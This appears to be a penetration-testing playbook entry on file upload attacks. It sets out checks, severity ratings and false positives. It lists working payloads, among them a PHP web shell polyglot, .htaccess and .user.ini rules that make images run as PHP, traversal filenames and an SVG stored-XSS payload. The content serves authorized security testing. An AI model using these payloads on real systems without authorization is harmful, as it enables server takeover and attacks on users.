---
id: file-upload
name: File Upload Attacks
phase: exploit
severity: critical
aliases: [file-upload, unrestricted-upload, webshell-upload, upload]
tags: [web, filesystem, rce]
---

# File Upload Attacks

## When to use
The target has avatar, attachment, import, document, or media upload endpoints accepting multipart/form-data.
Recon signal: user-controlled filename or Content-Type, files served back from a web-accessible path.
Uploads rendered inline (SVG, HTML) or stored under the webroot are especially dangerous.

## Quick checks
1. Upload a benign .txt or .jpg and record the storage path and returned URL.
2. Try executable extensions: .php, .jsp, .aspx, .py, and case variants like .pHp.
3. Bypass Content-Type checks by sending image/png with a script body and GIF89a magic bytes.
4. Test filename tricks: shell.php.jpg, shell.php%00.jpg, shell.pHp, .htaccess, .user.ini.
5. Upload SVG or HTML to test stored XSS on the serving origin.
6. Test traversal in filename: ../../shell.php and check the write location.

## Payloads / test cases
- shell.php containing <?php echo 7*7; ?>
- Polyglot: GIF89a;<?php system($_GET['c']); ?>
- filename="shell.php.jpg" with Content-Type: image/jpeg
- .htaccess: AddType application/x-httpd-php .jpg
- .user.ini: auto_prepend_file=shell.jpg
- SVG: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
- filename="../../../var/www/html/shell.php"

## Detection & confirmation
1. Confirm the uploaded file is retrievable at the returned URL.
2. Request the PHP payload and confirm execution (7*7 returns 49) rather than download.
3. For non-executable contexts, prove stored XSS with the SVG/HTML payload in a browser.
4. If blind, check for a download/preview endpoint or OOB callbacks from the payload.
5. Document which checks (extension, Content-Type, magic bytes, filename) were bypassed.

## Escalation
Upload to remote code execution -> P1; stored XSS via SVG/HTML on the app origin -> P2; arbitrary file write without execution -> P1/P2; inert upload -> P4 (see prioritization.md).

## Evidence to capture
- Raw multipart request including filename and Content-Type.
- Uploaded file URL and server response headers.
- Execution output (7*7 or id) screenshot.
- Stored XSS proof screenshot for SVG/HTML.
- Filesystem path or traversal used.

## Common false positives
- File stored outside the webroot and served through a download handler with Content-Disposition: attachment.
- CDN or proxy serves uploads from a sandboxed origin, neutralizing scripts.
- SVG sanitization strips event handlers and scripts.
- Server rewrites the extension or randomizes the filename, preventing execution.

## Related skills
- [[lfi]]
- [[ssti]]
- [[csrf]]
